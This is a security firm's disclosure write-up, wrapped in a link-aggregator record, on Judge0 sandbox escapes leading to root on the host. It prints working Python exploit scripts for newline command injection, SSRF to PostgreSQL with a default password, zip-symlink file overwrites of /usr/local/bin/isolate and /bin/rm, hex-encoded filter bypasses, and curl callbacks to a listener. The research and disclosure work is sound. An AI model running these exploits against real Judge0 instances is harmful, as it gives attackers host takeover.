{"aid": "40206697", "title": "Judge0 Sandbox Escape \u2013 allows obtaining root permissions", "url": "https://tantosec.com/blog/judge0/", "domain": "tantosec.com", "votes": 1, "user": "pentestercrab", "posted_at": "2024-04-30 02:37:36", "comments": 0, "source_title": "Judge0 Sandbox Escape", "source_text": "Judge0 Sandbox Escape\n\n  * Penetration testing\n  * Adversary simulation\n  * Training\n  * Security reviews\n  * How we engage\n  * About us\n  * Our team\n  * Careers\n  * Blog\n\n1300 182 686 INFO@TANTOSEC.COM\n\nCall Tanto\n\n  * Penetration testing\n  * Adversary simulation\n  * Training\n  * Security reviews\n  * How we engage\n  * About us\n  * Our team\n  * Careers\n  * Blog\n\nContact us\n\nMenu\n\nTANTO DOJO BLOG\n\nJudge0 is an open source service used to run arbitrary code inside a secure\nsandbox. The Judge0 website lists 23 clients using the service, with more than\n300 self hosted instances available on the public internet and potentially\nmany more within internal networks.\n\nTanto Security disclosed vulnerabilities in Judge0 that allows an adversary\nwith sufficient access to perform a sandbox escape and obtain root permissions\non the host machine. These vulnerabilities were assigned CVE-2024-29021,\nCVE-2024-28185 and CVE-2024-28189.\n\n## Introduction\n\nThis post will cover a Judge0 sandbox escape and how I discovered it,\nincluding source code analysis and exploitation. It began as a simple\nconversation with a friend who used the platform to offload the difficult task\nof secure sandboxed code execution which led me to investigate how it worked.\n\nJudge0 is used by organisations focused on development and cyber security\nincluding education and talent recruitment companies that must ensure the safe\nexecution of code. The service is often used within competitive programming\nenvironments where code must be tested to produce correct outputs that\ncorrelate with the provided inputs.\n\nI reviewed their research paper and had a look at their codebase to find out\nmore.\n\n## Investigating\n\nBy taking a brief look at the structure of the codebase, I found the\nfollowing:\n\n  1. A user submits their code via an API endpoint to Judge0.\n  2. A Ruby on Rails server receives this request and validates the submission data structure. It then inserts it into the PostgreSQL database.\n  3. Processing of the submission is queued as a Resque job.\n  4. The job is processed and run by the code within isolate_job.rb. This code uses the isolate binary to sandbox the submission.\n\nThe isolate binary uses Linux namespaces and control groups in a similar way\nto how Docker uses them to isolate containers. Judge0 ships inside a Docker\ncontainer running in --privileged mode so that it can access otherwise\nrestricted components of the host system. For example, it is possible to mount\nthe host filesystem and write files to it from a container running in\nprivileged mode.\n\nBecause of this, if access to a privileged docker container is achieved it\nshould be possible to break out and compromise the host system. More\ninformation can be found at this Hacktricks link.\n\n## The isolate_job.rb script\n\nMost of the interesting code is inside isolate_job.rb. This sets up the\nisolate sandbox, copies the relevant files inside of it, runs the job, and\nparses and stores the results.\n\nOne block of code caught my eye (can be found at this link):\n\n    \n    \n    unless submission.is_project # gsub is mandatory! command_line_arguments = submission.command_line_arguments.to_s.strip.encode(\"UTF-8\", invalid: :replace).gsub(/[$&;<>|`]/, \"\") File.open(run_script, \"w\") { |f| f.write(\"#{submission.language.run_cmd} #{command_line_arguments}\")} end\n\nThis code is in charge of creating run_script, a bash script used to execute\nthe correct program. While submission.language.run_cmd is not user controlled,\ncommand_line_arguments can be supplied via the Judge0 API (which is public in\nsome scenarios). I initially thought the gsub command was used to strip\nspecial characters out of the command line arguments that could for example be\nused to run additional processes.\n\nHowever, after reviewing this blacklist, I realised that \\n is another special\ncharacter that could be used to inject commands. After following the setup\ninstructions to run Judge0 locally, I tested to see if it would work.\n\n    \n    \n    curl --request POST \\ --url 'http://localhost:2358/submissions?wait=true' \\ --header 'Content-Type: application/json' \\ --data '{ \"source_code\": \"echo hi\", \"language_id\": 46, \"command_line_arguments\": \"x\\necho POC\" }'\n\nFrom this, I received the following response:\n\n    \n    \n    { \"stdout\": \"hi\\nPOC\\n\", \"time\": \"0.05\", \"memory\": 6548, \"stderr\": null, \"token\": \"c859f250-b8ad-4ff0-8182-08b82c2ba762\", \"compile_output\": null, \"message\": null, \"status\": { \"id\": 3, \"description\": \"Accepted\" } }\n\nThe \\n allowed us to run the echo POC command! I had to use x at the start of\nthe payload as otherwise the .strip method would remove the new line.\nFortunately, the addition of the x doesn\u2019t change the execution in any way.\n\nAlthough it is possible to execute code outside of the submission source_code,\nit doesn\u2019t help us as this is run inside the isolate sandbox. This seemed like\na dead end.\n\n## Ruby backticks\n\nThe way that Judge0 calls isolate is demonstrated in the following code:\n\n    \n    \n    command = \"isolate #{cgroups} \\ -s \\ -b #{box_id} \\ -M #{metadata_file} \\ #{submission.redirect_stderr_to_stdout ? \"--stderr-to-stdout\" : \"\"} \\ #{submission.enable_network ? \"--share-net\" : \"\"} \\ -t #{submission.cpu_time_limit} \\ -x #{submission.cpu_extra_time} \\ -w #{submission.wall_time_limit} \\ -k #{submission.stack_limit} \\ -p#{submission.max_processes_and_or_threads} \\ #{submission.enable_per_process_and_thread_time_limit ? (cgroups.present? ? \"--no-cg-timing\" : \"\") : \"--cg-timing\"} \\ #{submission.enable_per_process_and_thread_memory_limit ? \"-m \" : \"--cg-mem=\"}#{submission.memory_limit} \\ -f #{submission.max_file_size} \\ -E HOME=/tmp \\ -E PATH=\\\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\\" \\ -E LANG -E LANGUAGE -E LC_ALL -E JUDGE0_HOMEPAGE -E JUDGE0_SOURCE_CODE -E JUDGE0_MAINTAINER -E JUDGE0_VERSION \\ -d /etc:noexec \\ --run \\ -- /bin/bash run \\ < #{stdin_file} > #{stdout_file} 2> #{stderr_file} \\ \" # ... `#{command}`\n\nIt is interesting that the command is run using Ruby backticks which uses a\nshell to interpret the arguments. This means I could run commands in subshells\nthat would run outside of the isolate process if I could inject into these\nparameters, for example injecting $(id) into submission.stack_limit. This,\nhowever, turned out to be a dead end as all the values injected were either\nvalidated to be numerical or were constants referring to string literals.\n\n## What isn\u2019t inside the sandbox?\n\nThe code that runs after a job finished caught my eye:\n\n    \n    \n    def cleanup(raise_exception = true) fix_permissions `sudo rm -rf #{boxdir}/* #{tmpdir}/*` [stdin_file, stdout_file, stderr_file, metadata_file].each do |f| `sudo rm -rf #{f}` end `isolate #{cgroups} -b #{box_id} --cleanup` raise \"Cleanup of sandbox #{box_id} failed.\" if raise_exception && Dir.exists?(workdir) end\n\nThis contains commands inside backticks that run outside of the isolate\nprocess, making it a perfect candidate to try something malicious.\n\nboxdir refers to the path of the sandbox directory on the host system, meaning\nI can control all the files in this folder. From this, I came up with this\npotential exploit:\n\n  1. Use the submitted script to create a symlink called mylink in boxdir that points to /some/host/file\n  2. When cleanup is run, it should run sudo rm -rf /path/to/boxdir/mylink\n  3. Hopefully the rm -rf will follow the link and delete some files on the host system.\n\nThis failed as rm -rf would only follow mylink in this scenario if it ended in\na slash.\n\n## Running out of ideas - is isolate secure?\n\nAt this point I reviewed the documentation for isolate to find anything\ninteresting and stumbled across a flag called --share-net:\n\n    \n    \n    --share-net By default, isolate creates a new network namespace for its child process that contains no network devices except for a per-namespace loopback to prevent the program from communicating with the outside world. I can use this switch to keep the child process in parent\u2019s network namespace if I want to permit communication.\n\nAs there is no additional protection stopping the container from accessing\ninternal networks, we should be able to abuse this to forge server-side\nrequests (Also known as a Server Side Request Forgery vulnerability, or SSRF).\n--share-net is enabled in isolate when the Judge0 flag enable_network is\nenabled, which is allowed only if ALLOW_ENABLE_NETWORK is true in the Judge0\nconfig. ALLOW_ENABLE_NETWORK is true in the default Judge0 configuration.\n\nTo exploit this, I examined other services inside the docker compose file:\n\n    \n    \n    version: '2' x-logging: &default-logging logging: driver: json-file options: max-size: 100m services: server: image: judge0/judge0:1.13.0 volumes: - ./judge0.conf:/judge0.conf:ro ports: - \"2358:2358\" privileged: true <<: *default-logging restart: always workers: image: judge0/judge0:1.13.0 command: [\"./scripts/workers\"] volumes: - ./judge0.conf:/judge0.conf:ro privileged: true <<: *default-logging restart: always db: image: postgres:13.0 env_file: judge0.conf volumes: - postgres-data:/var/lib/postgresql/data/ <<: *default-logging restart: always redis: image: redis:6.0 command: [ \"bash\", \"-c\", 'docker-entrypoint.sh --appendonly yes --requirepass \"$$REDIS_PASSWORD\"' ] env_file: judge0.conf volumes: - redis-data:/data <<: *default-logging restart: always volumes: postgres-data: redis-data:\n\nPostgres and Redis were particularly interesting as they could potentially\nperform sensitive operations. Redis was less interesting as it scheduled and\ncoordinated Resque jobs, however the database was intriguing due to the way\nsubmissions are stored.\n\nI said earlier that validation of parameters occurs before the submission is\ncreated in the database, meaning that I could manually inject malicious\nparameters if I could interact with the database directly using the SSRF. The\nparameters injected into the shell command that runs isolate were of\nparticular interest, namely submission.stack_limit.\n\nA challenge was that the database column only accepts numerical values but\nsince Ruby is a dynamically typed language I was curious if I could simply\nchange the column type to be a string using a SQL command:\n\n    \n    \n    ALTER TABLE submissions ALTER stack_limit TYPE text\n\nSurprisingly Judge0 still functioned as usual with this column changing type!\nAll I needed to do was write a script that interacted with PostgreSQL and\nchange the stack_limit of a queued submission to be a shell payload such as\n$(id).\n\nIt was a challenge to create a way to interact with PostgreSQL without the\nability to easily use a library. I ended up writing my own code to implement\nthe Postgres messaging protocol. For ease of use I wrapped it in a script that\nwould also perform the POST request to the Judge0 API to submit. The code is\nas follows:\n\n    \n    \n    #!/usr/bin/env python3 import requests CMD = \"curl http://host.docker.internal:9001/\" SQL = \"ALTER TABLE submissions ALTER stack_limit TYPE text; UPDATE submissions SET stack_limit='$({})' WHERE id=(SELECT MAX(id) FROM submissions);\".format( CMD ) CODE = \"\"\"import socket import struct import hashlib import time s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\"db\", 5432)) class SMsg: def __init__(self, type): self.header = type.encode() if type is not None else b\"\" self.data = b\"\" def write_int(self, n): self.data += struct.pack(\">I\", n) def write(self, d): self.data += d def write_str(self, s): self.data += s.encode() + b\"\\\\x00\" def send(self): s.sendall(self.header + struct.pack(\">I\", len(self.data) + 4) + self.data) class RMsg: def __init__(self, type, data): self.type = type self.data = data def get_int(self): strt = self.data[:4] self.data = self.data[4:] return struct.unpack(\">I\", strt)[0] def get(self, n): strt = self.data[:n] self.data = self.data[n:] assert len(strt) == n return strt @staticmethod def read(): mtype = s.recv(1)[0] mlen = struct.unpack(\">I\", s.recv(4))[0] return RMsg(mtype, s.recv(mlen)) def md5(x): return hashlib.md5(x).hexdigest() m = SMsg(None) m.write_int(196608) m.write_str(\"user\") m.write_str(\"judge0\") m.write_str(\"database\") m.write_str(\"judge0\") m.write(b\"\\\\x00\") m.send() resp = RMsg.read() assert resp.type == ord(\"R\") assert resp.get_int() == 5 # md5 encryption salt = resp.get(4) assert resp.data == b\"\" m = SMsg(\"p\") m.write_str(\"md5\" + md5(md5(b\"YourPasswordHere1234\" + b\"judge0\").encode() + salt)) m.send() print(s.recv(1024)) m = SMsg(\"Q\") m.write_str(\"{}\") m.send() print(s.recv(1024))\"\"\".format( SQL ) TARGET = \"http://localhost:2358\" def submit(src): return requests.post( TARGET + \"/submissions\", json={\"source_code\": src, \"language_id\": 71, \"enable_network\": True}, ).json() # if it doesnt work try increasing this NUM_PADDING = 20 for i in range(NUM_PADDING): submit(\"print('hi')\") submit(CODE) for i in range(NUM_PADDING): submit(\"print('hi')\")\n\nSome points to note:\n\n  1. Authenticating to PostgreSQL requires a password. This password is configurable using the judge0.conf file, however, when following the deployment instructions there is no indication to change this from the default so I assume that many configurations could still be using the default password (which is YourPasswordHere1234).\n\n     * Even if the password has been changed, it would be possible to create a submission that can brute force this password.\n  2. I made 41 submissions to ensure that some submissions will be queued up. This was important as I wanted to run a SQL query to modify the run arguments of a submission that has not yet been consumed by a worker. The number required here depends on the speed and number of workers on the Judge0 server.\n\nThe proof of concept confirmed code execution by way of a web request to my\nhost machine using curl (this may take some time as the server must execute\nall jobs before the payload is executed).\n\nFrom here, I could create a reverse shell and then potentially escape the\nDocker container by mounting the host disk (which is allowed as the container\nis running in privileged mode). Later on, I reported this vulnerability and it\nwas assigned CVE-2024-29021.\n\n## Digging deeper\n\nI found a sandbox escape, so does that mean my work here is done? Of course\nnot!\n\nThere are a few problems with this exploit:\n\n  1. It requires us to be able to use the enable_network flag.\n\n     * This is unlikely to be possible with many self hosted applications, which use Judge0 inside of an internal network. The application would have to contain functionality to allow us to set the enable_network flag (which is unlikely as it doesn\u2019t seem necessary in a lot of use cases)\n     * https://ce.judge0.com is a publicly hosted Judge0 instance, however it has ALLOW_ENABLE_NETWORK disabled in its config file.\n  2. It requires the default password for the database to be unchanged. Although the setup guide does not tell you to change it, there is a warning in the config file:\n    \n        # Password of the user. Cannot be blank. Used only in production. # Default: NO DEFAULT, YOU MUST SET YOUR PASSWORD POSTGRES_PASSWORD=YourPasswordHere1234\n\nI would like to find an exploit that doesn\u2019t have these issues. In an ideal\nscenario, all I would need is to control the source code and I can get a\nsandbox escape that way. To investigate this, I decided to take another look\nat some of my older ideas.\n\n## Sandboxed filesystem symlinks revisited\n\nAs I revisited the rm -rf failed exploit attempt, I decided to try a similar\nexploit targeting the following code (found here):\n\n    \n    \n    `sudo chown $(whoami): #{run_script} && rm #{run_script}` unless submission.is_project\n\nTo do this I replaced the run_script with a symlink to an absolute path on the\nhost filesystem. And it turned out this worked! The file on the host system\nhad its owner successfully changed.\n\nI tried to use this to cause the program to crash and create a Denial of\nService, but I couldn\u2019t get it to work. However, it did put the following\nthought in my mind:\n\n> The rm command cannot be exploited here as they are their own file which can\n> be unlinked. However, chown works with symlinks here as it changes data\n> about the file.\n\nAnd then I realised that the answer had been in front of me the entire time!\nIf you remember this code from the very start of this investigation:\n\n    \n    \n    unless submission.is_project # gsub is mandatory! command_line_arguments = submission.command_line_arguments.to_s.strip.encode(\"UTF-8\", invalid: :replace).gsub(/[$&;<>|`]/, \"\") File.open(run_script, \"w\") { |f| f.write(\"#{submission.language.run_cmd} #{command_line_arguments}\")} end\n\nThis code writes to a file called run_script (which is just the full path of a\nfile called run inside the sandbox directory). However, this file write is\nperformed outside of the isolate sandbox! That means that if I created a\nsymlink named run inside the sandbox directory, this would write to the file\npointed to by the symlink. In other words, I have an arbitrary file write\nvulnerability!\n\nThere were a few hurdles to get this to work:\n\n  1. I needed to create the run symlink before the file write occurs. I did this using the gsub bypass mentioned earlier, however this time using the compiler_options flag instead of the command_line_arguments flag. This works as the vulnerable code runs after the compile stage.\n  2. The file write could be used to overwrite important files and cause a Denial of Service, but I wanted to get code execution. To do this, I created a shell script using the gsub bypass but this time using command_line_arguments. While the first line will likely fail as it will try and execute the compiled submission (which will not be in the current working directory at this point), bash does not exit the script if a single line fails so our payload should still be executed.\n\nHere is a sample exploit script:\n\n    \n    \n    #!/usr/bin/env python3 import requests TARGET = \"http://localhost:2358\" print(requests.post( TARGET + \"/submissions?wait=true\", json={ \"source_code\": \"NOT IMPORTANT\", \"language_id\": 73, # Rust \"compiler_options\": \"--version\\nln -s ../../../../../../usr/local/bin/isolate ./run\\n#\", \"command_line_arguments\": \"x\\ncurl http://host.docker.internal:9001/rce\" }, ).json())\n\nThis script uses the symlink to overwrite /usr/local/bin/isolate, the binary\ncalled to run submissions. Let\u2019s take a look at how the code handles this:\n\n  1. When the program is compiled, isolate_job.rb runs the following code:\n\n    \n    \n    # gsub can be skipped if compile script is used, but is kept for additional security. compiler_options = submission.compiler_options.to_s.strip.encode(\"UTF-8\", invalid: :replace).gsub(/[$&;<>|`]/, \"\") File.open(compile_script, \"w\") { |f| f.write(\"#{submission.language.compile_cmd % compiler_options}\") }\n\nAs compile_cmd for Rust (which is language_id 73) is\n/usr/local/rust-1.40.0/bin/rustc %s main.rs, this will result in the following\ncompile_script being written to disk:\n\n    \n    \n    /usr/local/rust-1.40.0/bin/rustc --version ln -s ../../../../../../usr/local/bin/isolate ./run # main.rs\n\nThis sets up our symlink for when the program is run. The following code\nwrites to the run_script:\n\n    \n    \n    # gsub is mandatory! command_line_arguments = submission.command_line_arguments.to_s.strip.encode(\"UTF-8\", invalid: :replace).gsub(/[$&;<>|`]/, \"\") File.open(run_script, \"w\") { |f| f.write(\"#{submission.language.run_cmd} #{command_line_arguments}\")}\n\nAs run_cmd for Rust is ./main, this will result in the following being written\nto run_script:\n\n    \n    \n    ./main x curl http://host.docker.internal:9001/rce\n\nAs run_script symlinks to the isolate binary, the isolate binary will be\noverwritten and called, causing our payload to be executed outside of the\nsandbox.\n\nBy starting a listener on port 9001 of our host machine and running the script\nwe can see that the curl command was successful:\n\n    \n    \n    \u279c judge0-v1.13.0 nc -l 9001 GET /rce HTTP/1.1 Host: host.docker.internal:9001 User-Agent: curl/7.64.0 Accept: */*\n\nIt is worth noting that I can\u2019t use any of the blacklisted gsub characters in\nthe injected command. This can be bypassed using the following command which\nencodes the payload:\n\n    \n    \n    python3 -c 'eval(bytes.fromhex(\"7072696e7428227263652229\").decode())'\n\nThis method is significantly more impactful due it not requiring prior\nknowledge of the Postgres password. While the options for enabling custom\ncommand line arguments and compile time arguments may not always be available,\nthese are commonly needed by end users to ensure successful compilation.\n\n## What if the gsub issue was patched?\n\nEven if users can only control the source code and language (and not the\ncommand line or compile options), it may still be possible to perform\narbitrary file write and cause Denial of Service - I would just need to find a\nway of creating a symlink during the compilation step.\n\nJudge0 supports many languages, and it is likely that one of these would allow\nfor the creation of symlinks during compilation. However, the only content in\nthe written file that can be controlled is the command line arguments, (which\ncannot be edited without supplying the relevant parameter to Judge0), so code\nexecution without controlling this parameter does not seem possible.\n\nHowever, would it be possible to still get code execution if the gsub command\nworked as intended and prevented shell command injection? This should be\npossible if I can find alternative ways to create the symlink before the\nprogram is run and to make the run script run our code correctly.\n\n  1. For creating the symlink before the program is run, I can make use of the additional_files Judge0 argument. This allows us to upload a zip file which will be extracted on the server. As zip files can contain symlinks, I can inject our symlink at this step! This bypasses the need for compilation at all, so I am now open to playing around with interpreted languages.\n\n  2. For making the run script work, I took a deeper look at how command_line_arguments worked. Maybe there was a program in the list of languages that allows me to execute code through a command line argument?\n\nAfter some digging I managed to find a language that fits this criteria:\nSQLite. Many other languages didn\u2019t work as processable arguments must be\nspecified before the script name (and I can only inject after the script\nname), however SQLite receives a script from standard input.\n\nHere is the proof of concept without relying on the gsub oversight:\n\n    \n    \n    #!/usr/bin/env python3 import requests import io import zipfile import base64 import stat TARGET = \"http://localhost:2358\" # Command to run outside of isolated environment CMD = \"curl http://host.docker.internal:9001/\" # Create zipfile in memory zip_buffer = io.BytesIO() with zipfile.ZipFile(zip_buffer, \"a\", zipfile.ZIP_DEFLATED, False) as zip_file: # Add symlink to zipfile. The symlink is called \"run\" and points to \"/usr/local/bin/isolate\" symlink_file = zipfile.ZipInfo(\"run\") symlink_file.create_system = 3 unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH symlink_file.external_attr = unix_st_mode << 16 zip_file.writestr(symlink_file, '/usr/local/bin/isolate') # To avoid running into issues with the filter, the command can be encoded within python hex_payload = CMD.encode().hex() encoded_command = 'python3 -c __import__(\"os\").system(bytes.fromhex(\"{}\").decode())'.format(hex_payload) encoded_command = encoded_command.replace(\"(\",\"\\\\\\\\(\").replace(\")\",\"\\\\\\\\)\").replace('\"','\\\\\\\\\"') # Submit the zipfile to the server. print(requests.post( TARGET + \"/submissions?wait=true\", json={ \"source_code\": \"NOT IMPORTANT\", \"language_id\": 82, # SQLite \"additional_files\": base64.b64encode(zip_buffer.getvalue()).decode(), \"command_line_arguments\": f\"-cmd '.shell {encoded_command}'\" }, ).json()['stdout'])\n\n## The Patch\n\nAt this point I was ready to report the vulnerability to the developer. The\ndeveloper (Herman Do\u0161ilovi\u0107) was very eager to fix the issue! CVE-2024-28185\nwas assigned to the vulnerability, and a patch was deployed shortly after. The\npatch can be found at this link, and looks like the following:\n\nThis change essentially changes the Linux user that the Ruby on Rails\napplication runs as. This is interesting as I was expecting the patch to be\nsomething to do with preventing symbolic links for being the target of file\noperations in isolate_job.rb.\n\nThe reason the patch was created was that the previous exploit overwrote\n/usr/local/bin/isolate, a file owned by root. This change breaks the proof of\nconcept because the judge0 user does not have permission to overwrite\n/usr/local/bin/isolate.\n\nHowever, this is the only thing preventing us from exploiting the\nvulnerability. We can still write to arbitrary files outside of the sandbox!\nWith that in mind, I started searching for a way to get code execution despite\nthe patch.\n\n## The Patch Bypass\n\nIf you remember from earlier, we managed to find a way to run the Linux chown\ncommand on arbitrary files in the filesystem. This turned out to be not very\nuseful at the time as the application runs as root. After the patch the\napplication runs as the lower privilege Judge0 user. This means that the chown\nexploit now has a use - to change the owner of our target so that we can\noverwrite it as done previously.\n\nTo do this, all we need to do is chown the target binary to the current user,\nand then perform the symlink exploit to overwrite the binary with a malicious\nscript. I tried doing this to /usr/local/bin/isolate, but it turns out that\nisolate needs to be owned by root to function correctly. Instead, we can\noverwrite the /bin/rm binary which will achieve the same effect.\n\nThe resulting exploit script looks like this:\n\n    \n    \n    #!/usr/bin/env python3 import requests import io import zipfile import base64 import stat # Target address of Judge0 server TARGET = \"http://localhost:2358\" # Command to run outside of the sandbox CMD = \"echo SANDBOX ESCAPED > /tmp/poc\" # File on the target to overwrite as a means of getting a sandbox escape TARGET_FILE = \"/bin/rm\" # Helper to create a zipfile with a single symbolic link inside def create_zipfile_with_link(link_name, link_path): zip_buffer = io.BytesIO() with zipfile.ZipFile(zip_buffer, \"a\", zipfile.ZIP_DEFLATED, False) as zip_file: symlink_file = zipfile.ZipInfo(link_name) symlink_file.create_system = 3 unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH symlink_file.external_attr = unix_st_mode << 16 zip_file.writestr(symlink_file, link_path) return base64.b64encode(zip_buffer.getvalue()).decode() # To avoid running into issues with the gsub filter, we will encode the command as hex and decode it using python3. # Decoding and running with python3 doesn't use the filtered characters: $&;<>|` hex_payload = CMD.encode().hex() encoded_command = 'python3 -c __import__(\"os\").system(bytes.fromhex(\"{}\").decode())'.format(hex_payload) encoded_command = encoded_command.replace(\"(\",\"\\\\\\\\(\").replace(\")\",\"\\\\\\\\)\").replace('\"','\\\\\\\\\"') # Run an initial request that will cause the code to accidentally chown TARGET_FILE. # Required on v1.13.1 as the code runs as judge0 user, meaning we need to chown to be able to write to TARGET_FILE. print(requests.post( TARGET + \"/submissions?wait=true\", json={ \"source_code\": f\"mv run runbak; ln -s {TARGET_FILE} run\", \"language_id\": 46, # Bash }, ).json()['stdout']) # Send the command to write to TARGET_FILE. This will overwrite TARGET_FILE with our sqlite command. # The sqlite command calls python3, which will execute our CMD. print(requests.post( TARGET + \"/submissions?wait=true\", json={ \"source_code\": \"NOT IMPORTANT\", \"language_id\": 82, # SQLite \"additional_files\": create_zipfile_with_link(\"run\", TARGET_FILE), \"command_line_arguments\": f\"-cmd '.shell {encoded_command}'\" }, ).json()['stdout'])\n\nI reported this vulnerability to the developer, and a patch was deployed.\nCVE-2024-28189 was assigned to this issue.\n\n## Further findings\n\nWhile the issue is no longer exploitable, the root cause of the issue still\nremains. The application still currently allows arbitrary file write outside\nof the sandbox. After this I found one more bypass that wrote to\n/api/tmp/environment, a script automatically run by the application. This\nissue was then patched in this commit.\n\nWhile the core arbitrary file write issue remains, it is likely there are\nother paths to achieve command execution. I raised my concern with Herman, who\ninformed me that it would be better not to make major changes to the codebase\nif not necessary.\n\nWhile I\u2019m still not entirely happy with this fix, I can\u2019t find another working\nproof of concept with the time available to me. In the future I may have\nanother attempt, or maybe someone reading this blog would like to try \ud83d\ude05\n\n## Shoutouts\n\nI would like to shoutout to Herman Do\u0161ilovi\u0107 who is the developer of Judge0\nand helped me to resolve these issues. Herman has a quick response time and\nwas very committed to deploying patches as quickly as possible. It was obvious\nthat Herman cares a lot about application security and the confidentiality of\nhis customers.\n\nI would also like to thank my colleagues at Tanto Security who helped me\ncorrectly report and publish this issue.\n\n## Timeline\n\nDate (D/M/Y)| Milestone  \n---|---  \n4/3/2024| CVE-2024-28185 reported to Judge0 developer  \n6/3/2024| Vulnerability patched by developer  \n8/3/2024| Patch bypass (CVE-2024-28189) found and reported  \n9/3/2024| CVE-2024-28189 vulnerability patched  \n10/3/2024| Bypass using /api/tmp/environment patched  \n19/3/2024| CVE-2024-29021 reported to Judge0 developer  \n18/4/2024| CVE-2024-29021 patched  \n18/4/2024| Public disclosure of CVEs and release of patched version  \n29/4/2024| Public release of proof of concepts and exploit scripts  \n  \n## Conclusion\n\nWhilst I didn\u2019t achieve my goal of being able to perform a sandbox escape\nusing only the source_code parameter, I still discovered a vulnerability that\nhas significant impact to users of Judge0. All the vulnerabilities detailed in\nthis article have been fixed in version v1.13.1. If you are using a self\nhosted Judge0 instance, update to v1.13.1 or higher to be protected against\nthese attacks.\n\n## About the Author\n\nDaniel Cooper is a Security Consultant at Tanto Security. He is interested in\nweb security research and playing in CTFs. You can connect with him on\nLinkedIn.\n\nresearch cve vulnerability daniel\n\nLet our seasoned experts sharpen your cyber security. Call 1300 1 TANTO 82686\nor send us a message.\n\nCONTACT Let\u2019s talk\n\nPlease include a little about the service you are after and what you need\ndone. We will work with you to achieve the desired result.\n\n1300 182 686\n\nsales@tantosec.com\n\nGot sensitive information? Download our PGP key\n\nLevel 19, 15 William Street MELBOURNE VIC 3000 AUSTRALIA\n\nLevel 21, 60 Margaret Street SYDNEY NSW 2000 AUSTRALIA\n\nPlease include a little about the service you are after and what you need\ndone. We will work with you to achieve the desired result.\n\nRead terms & conditions\n\nProtected by reCAPTCHAv3\n\nProtected by reCAPTCHAv3\n\nWe respectfully acknowledge the Traditional Custodians of all the lands on\nwhich we work and pay our respects to the elders past present and emerging.\n\nRead our Privacy Policy\n\n  * How we engage\n  * Penetration testing\n  * Adversary simulation\n  * Training\n  * Security reviews\n\n  * About us\n  * Our team\n  * Careers\n  * Blog\n  * Contact\n\nCopyright \u00a9 2024 tanto\n\n", "frontpage": false}
